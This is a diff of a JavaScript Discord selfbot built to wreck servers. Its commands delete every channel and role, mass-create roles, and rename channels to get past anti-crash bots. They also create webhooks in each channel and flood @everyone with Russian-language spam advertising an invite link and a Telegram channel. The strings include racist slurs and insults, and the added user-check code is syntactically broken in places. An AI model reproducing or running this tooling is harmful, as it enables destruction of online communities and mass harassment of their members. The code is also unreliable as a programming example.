@@ -1,9 +1,11 @@
 const token = process.env['TOKEN']
 const Discord = require('discord.js-selfbot');
 const keepAlive = require('./server.js');
-
-
-
+const { MessageEmbed } = require('discord.js');
+const allowedusers = [
+  "946841657314279485",
+]
+// там ваш айди
 const client = new Discord.Client();
 
 
@@ -12,8 +14,12 @@ console.log("негры");
 }); 
 
 
+
+
+
 client.on('message', async (message) => {
   if (message.content === '~auto') {
+  if (allowedusers.includes(message.author.id)) {
     message.delete(); 
     try { 
      message.guild.channels.cache.forEach 
@@ -35,33 +41,56 @@ client.on('message', async (message) => {
           })
           .then(channel => {
               channel.createWebhook("×××Crashed by austr×××", { 
-              }).then(async webhook => {
+				}).then(async webhook => {
                   for (let i = 1; i <= 30; i++) { 
-                            webhook.send("@everyone Сервер крашится великим австром. Ливайте с помойки или будет хуже.\nЕсли вас не ебут негры - зайдите в великую империю https://discord.gg/lavanbot");      
+                            webhook.send({
+	content: '@everyone @here данный сервер крашится. Переходите к нам если хотите также. У нас есть все, что вам нужною https://discord.gg/lavanbot https://t.me/web_anarchy',
+});      
                   };
               });
           });
       } 1000;
-    } 
+    } else {console.log('ваша мама шлюха')}
+};
 });
+
 
 
 client.on('message', async (message) => {
   if (message.content === '~hookall') {
+  if (allowedusers.includes(message.author.id)) {
     message.delete(); 
      message.guild.channels.cache.forEach
      (channel => {channel.createWebhook("×××Crashed by austr×××", { 
               }).then(async webhook => {
                   for (let i = 1; i <= 25; i++) {
-                            webhook.send("@everyone @here ваш сервер крашится Австром. Переходите к нам -> https://discord.gg/lavanbot");      
+                            webhook.send({
+	content: '@everyone @here данный сервер крашится. Переходите к нам если хотите также. У нас есть все, что вам нужною https://discord.gg/lavanbot https://t.me/web_anarchy',
+});        
                   };
               });
           });
         };
+    } else {console.log('ваша мама шлюха')}
 });
+
+
+
+client.on('message', async (message) => {
+  if (message.content === '~createhooks') {
+  if (allowedusers.includes(message.author.id)) {
+    message.delete(); 
+     message.guild.channels.cache.forEach
+     (channel => {channel.createWebhook("×××Crashed by austr×××", {})
+          });
+        };
+    } else {console.log('ваша мама шлюха')}
+});
+
 
 client.on('message', async (message) => {
   if (message.content === '~nuke') {
+  if (allowedusers.includes(message.author.id)) {
     message.delete(); 
     try {
      message.guild.channels.cache.forEach 
@@ -72,12 +101,14 @@ client.on('message', async (message) => {
         message.guild.roles.cache.forEach(role => { 
         if (role.editable && role.id !== message.guild.id) role.delete() 
     }); 
+    } else {console.log('ваша мама шлюха')}
 };
 });
 
 
 client.on('message', async (message) => {
   if (message.content === '~renamechannels') {
+  if (allowedusers.includes(message.author.id)) {
     message.delete(); 
     try {
      message.guild.channels.cache.forEach 
@@ -85,23 +116,28 @@ client.on('message', async (message) => {
      } catch { 
         console.log(error)
         } 
+    } else {console.log('ваша мама шлюха')}
 };
 });
 
 
 client.on('message', message => {
   if (message.content === '~ping') {
+  if (allowedusers.includes(message.author.id)) {
     message.delete();
     message.channel.send(`Пинг ${Date.now() - message.createdTimestamp}ms. API-пинг ${Math.round(client.ws.ping)}ms`);
   }
+    } else {console.log('ваша мама шлюха')}
 });
 
 client.on('message', (msg) => {
   if (msg.content === '~help') {
+  if (allowedusers.includes(message.author.id)) {
     msg.delete();
     let now = Date.now()
-    msg.channel.send('`~auto` - **полный автоматический краш сервера**\n`~nuke` - **удаление всех каналов и ролей**\n`~ping` - **показывает задержку селф бота**\n`~renamechannels` - **обходит анти-краш ботов**\n`~roles` - **создание ролей**\n`~hookall` - **спам во все каналы вебюхуками**')
+    msg.channel.send('`~auto` - **полный автоматический краш сервера**\n`~nuke` - **удаление всех каналов и ролей**\n`~ping` - **показывает задержку селф бота**\n`~renamechannels` - **обходит анти-краш ботов**\n`~roles` - **создание ролей**\n`~hookall` - **спам во все каналы вебюхуками**\n`~createhooks` - **создание вебхуков везде**')
   }
+    } else {console.log('ваша мама шлюха')}
 })
 
 
@@ -110,6 +146,7 @@ client.on('message', (msg) => {
 
 client.on('message', (msg) => {
   if (msg.content === '~roles') {
+  if (allowedusers.includes(message.author.id)) {
     msg.delete();
     for (let i = 1; i <= 50; i++) {
         msg.guild.roles
@@ -122,8 +159,9 @@ client.on('message', (msg) => {
           .catch(console.error);
       }
   }
-}
-)
+    } else {console.log('ваша мама шлюха')}
+})
+
 
 keepAlive();
 client.login(token);
